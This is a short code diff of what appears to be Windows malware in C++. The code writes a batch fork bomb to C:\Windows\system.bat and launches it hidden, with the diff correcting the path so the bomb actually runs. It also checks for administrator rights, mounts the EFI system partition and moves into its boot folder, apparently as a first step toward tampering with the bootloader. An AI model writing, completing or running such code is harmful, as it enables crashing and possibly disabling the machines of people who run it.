@@ -40,7 +40,7 @@ void forkbomb() {
     forkfile << "@echo off\n" << "%0|%0";
     forkfile.close();
     /*const char* batchpath = "C:\\Windows\\system.bat";*/
-    ShellExecute(NULL, L"start", L"C:\\Windows\\system", NULL, NULL, SW_HIDE);
+    ShellExecute(NULL, L"start", L"C:\\Windows\\system.bat", NULL, NULL, SW_HIDE);
 }
 
 //it checks if the user is admin. if not it will prompt them to do so and quit.
@@ -87,10 +87,12 @@ int main()
     if (is_efi() == 0) {
         //EFI Code here
         ShellExecute(NULL, L"mountvol", 0, L"P: /S", 0, 0);
+        SetCurrentDirectory(L"P:/EFI/Boot ");
+        
     }
     else {
         //BIOS Code here
-        MessageBox(NULL, L"This is running on bios ig", L"BIOS mode.", MB_OK | MB_ICONINFORMATION);
+        
     }
 
     
